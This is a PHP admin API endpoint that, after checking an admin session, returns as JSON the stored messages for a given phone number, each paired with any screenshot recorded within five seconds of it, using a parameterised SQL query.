<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

header('Content-Type: application/json');

if (!isset($_SESSION['admin_login']) || $_SESSION['admin_login'] !== true) {
    echo json_encode(['success' => false, 'error' => 'Unauthorized']);
    exit;
}

require_once __DIR__ . '/../config/db.php';

$phone = trim($_GET['phone'] ?? '');
$lastId = (int)($_GET['last_id'] ?? 0);

if ($phone === '') {
    echo json_encode(['success' => false, 'error' => 'Phone required']);
    exit;
}

$stmt = $conn->prepare("
    SELECT messages.*, screenshots.image_id
    FROM messages
    LEFT JOIN screenshots
        ON messages.phone = screenshots.phone
        AND screenshots.created_at BETWEEN
            DATE_SUB(messages.created_at, INTERVAL 5 SECOND)
            AND DATE_ADD(messages.created_at, INTERVAL 5 SECOND)
    WHERE messages.phone = ? AND messages.id > ?
    ORDER BY messages.id ASC
");

$stmt->bind_param("si", $phone, $lastId);
$stmt->execute();
$result = $stmt->get_result();

$messages = [];
while ($row = $result->fetch_assoc()) {
    $messages[] = $row;
}

echo json_encode(['success' => true, 'messages' => $messages]);

$stmt->close();
$conn->close();

?>
